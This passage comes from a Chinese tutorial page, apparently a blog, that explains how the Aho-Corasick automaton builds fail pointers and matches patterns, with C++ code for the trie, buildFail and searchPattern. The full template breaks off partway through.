class="mclose">)</span></span></span></span>的fail指针，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fail(v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span>。也就是说，我们需要找到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>节点代表的字符串的最长后缀。由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fail(u)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span></span></span></span>是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span>的最长后缀，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(fail(u),c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>存在，那么其一定是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>的最长后缀。否则，我们再试图找<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fail(u)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span></span></span></span>的最长后缀<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">fail(fail(u))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(fail(fail(u)),c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>是否存在…直到我们回溯到了根节点，且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(root,c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>也不存在，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>无法匹配任何模式。</p><p>注意，由于上述实际上是一个递归过程，因此我们需要自行处理初始的fail指针。不过这也很容易，第一层的节点的fail指针全部指向<code>root</code>，因为对于单字符的字符串而言，其最长后缀就是空字符串（由<code>root</code>代表）。</p><p>下面是根据已有字典树构建<code>fail</code>指针的C++实现。</p><details class="tag-plugin colorful folding" ><summary><span>构建fail指针的C++实现</span></summary><div class="body"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// struct AC_node &#123;</span></span><br><span class="line"><span class="comment">//     ...</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AC_Automaton</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    AC_node *root;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">childEnque</span><span class="params">(AC_node *p, queue&lt;AC_node*&gt; &amp;q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;son[i] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(p-&gt;son[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// AC_Automaton() &#123;</span></span><br><span class="line">    <span class="comment">//     ...</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// AC_node* getRoot() &#123;</span></span><br><span class="line">    <span class="comment">//     return root;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// bool addString(string&amp; s) &#123;</span></span><br><span class="line">    <span class="comment">//     ...</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buildFail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        queue&lt;AC_node*&gt; q;</span><br><span class="line">        <span class="comment">// 深度为1的节点入队</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;son[i]) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(root-&gt;son[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="comment">// 队首出队</span></span><br><span class="line">            AC_node *p = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 分配失配指针</span></span><br><span class="line">            <span class="comment">// 特殊情况1： 深度为1的节点失配指针都是根节点</span></span><br><span class="line">            <span class="keyword">if</span>(p-&gt;depth == <span class="number">1</span>) &#123;</span><br><span class="line">                p-&gt;fail = root;</span><br><span class="line">                <span class="comment">// 将子节点入队</span></span><br><span class="line">                <span class="built_in">childEnque</span>(p, q);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 否则是普通情况</span></span><br><span class="line">            AC_node* tmp = p-&gt;parent-&gt;fail;</span><br><span class="line">            <span class="keyword">while</span>(tmp) &#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp-&gt;son[p-&gt;data - <span class="string">&#x27;a&#x27;</span>] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    p-&gt;fail = tmp-&gt;son[p-&gt;data - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp = tmp-&gt;fail;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!tmp)&#123;<span class="comment">//说明没找到合适的失配指针</span></span><br><span class="line">                p-&gt;fail = root;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 该节点所有子节点入队</span></span><br><span class="line">            <span class="built_in">childEnque</span>(p, q);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="comment">// end while</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></details><h2 id="匹配过程"><a class="markdownIt-Anchor" href="#匹配过程"></a> 匹配过程</h2><p>完成了AC自动机的构建，我们进行多模块匹配的算法就极其简单了。我们使用一个指针存储目前已匹配的位置<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span>，即指向字典树中的某一个节点。对于下一个字符<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(u,c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>存在，则直接将指针指向<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(u,c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>即可；反之，指向<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>f</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(fail(u),c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span>。</p><p>上述操作结束后，检查目前指向的节点的<code>terminal</code>，若为真，则已抵达某个模式字符串的末尾，即匹配成功；反之，继续读入文本的下一个字符，重复上述转移过程。</p><p>以下是匹配过程的C++实现。</p><details class="tag-plugin colorful folding" ><summary><span>进行匹配的C++实现</span></summary><div class="body"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// struct AC_node &#123;</span></span><br><span class="line"><span class="comment">//     ...</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AC_Automaton</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    AC_node *root;</span><br><span class="line">    <span class="comment">// void childEnque(AC_node *p, queue&lt;AC_node*&gt; &amp;q) &#123;</span></span><br><span class="line">    <span class="comment">//     ...</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// AC_Automaton() &#123;</span></span><br><span class="line">    <span class="comment">//     ...</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// AC_node* getRoot() &#123;</span></span><br><span class="line">    <span class="comment">//     return root;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// bool addString(string&amp; s) &#123;</span></span><br><span class="line">    <span class="comment">//     ...</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// void buildFail() &#123;</span></span><br><span class="line">    <span class="comment">//     ...</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">searchPattern</span>(string&amp; s) &#123;</span><br><span class="line">        AC_node *p = root;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;s.<span class="built_in">length</span>(); ++i) &#123;</span><br><span class="line">            <span class="type">char</span> c = s[i];</span><br><span class="line">            <span class="keyword">while</span>(p != <span class="literal">nullptr</span> &amp;&amp; p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                p = p-&gt;fail;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p) &#123;</span><br><span class="line">                p = p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>];    <span class="comment">// 前进一步匹配</span></span><br><span class="line">                <span class="comment">// 判断是否匹配了完整的串</span></span><br><span class="line">                <span class="keyword">if</span>(p-&gt;terminal) &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(vector&lt;<span class="type">int</span>&gt;&#123;i-p-&gt;depth + <span class="number">1</span>, i&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                p = root;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   <span class="comment">// end for</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></details><h2 id="ac自动机的完整模板代码"><a class="markdownIt-Anchor" href="#ac自动机的完整模板代码"></a> AC自动机的完整模板代码</h2><details class="tag-plugin colorful folding" ><summary><span>AC自动机的完整C++模板代码</span></summary><div class="body"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">AC_node</span> &#123;</span><br><span class="line">    AC_node *parent;</span><br><span class="line">    AC_node *son[<span class="number">26</span>] = &#123;<span class="literal">nullptr</span>&#125;;</span><br><span class="line">    <span class="type">bool</span> terminal = <span class="literal">false</span>;</span><br><span class="line">    AC_node *fail = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    <span class="type">int</span> depth;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">AC_node</span>(<span class="type">char</span> d, <span class="type">bool</span> t, AC_node *p, <span class="type">int</span> dep, AC_node *pt) &#123;</span><br><span class="line">        data = d;</span><br><span class="line">        terminal = t;</span><br><span class="line">        fail = p;</span><br><span class="line">        depth = dep;</span><br><span class="line">        parent = pt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AC_Automaton</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    AC_node *root;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">childEnque</span><span class="params">(AC_node *p, queue&lt;AC_node*&gt; &amp;q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;son[i] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(p-&gt;son[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">AC_Automaton</span>() &#123;</span><br><span class="line">        root = <span class="keyword">new</span> <span class="built_in">AC_node</span>(<span class="string">&#x27;a&#x27;</span>, <span class="literal">false</span>, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="comment">// root-&gt;fail = root;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">AC_node* <span class="title">getRoot</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">addString</span><span class="params">(string&amp; s)</span> </span>&#123;</span><br><span class="line">        AC_node *p = root;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c: s) &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> <span class="built_in">AC_node</span>(c, <span class="literal">false</span>, <span class="literal">nullptr</span>, p-&gt;depth + <span class="number">1</span>, p);</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;son[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;<span class="comment">// end for</span></span><br><span class="line">        p-&gt;terminal = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buildFail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        queue&lt;AC_node*&gt; q;</span><br><span class="line">        <span class="comment">// 深度为1的节点入队</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">26</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;son[i]) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(root-&gt;son[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="comment">// 队首出队</span></span><br><span class="line">            AC_node *p = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 分配失配指针</span></span><br><span class="line">            <span class="comment">// 特殊情况1： 深度为1的节点失配指针都是根节点</span></span><br><span class="line">            <span class="keyword">if</span>(p-&gt;depth == <span class="number">1</span>) &#123;</span><br><span class="line">                p-&gt;fail = root;</span><br><span class="line">                <span class="comment">// 将子节点入队</span></span><br><span class="line">                <span class="built_in">childEnque</span>(p, q);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 否则是普通情况</span></span><br><span class="line">            AC_node* tmp = p-&gt;parent-&gt;fail;</span><br><span class="line">            <span class="keyword">while</span>(tmp) &#123;</span><br><span class="line">                <span class="keyword">if</span>(tmp-&gt;son[p-&gt;data - <span class="string">&#x27;a&#x27;</span>] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    p-&gt;fail = tmp-&gt;son[p-&gt;data - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                    <span 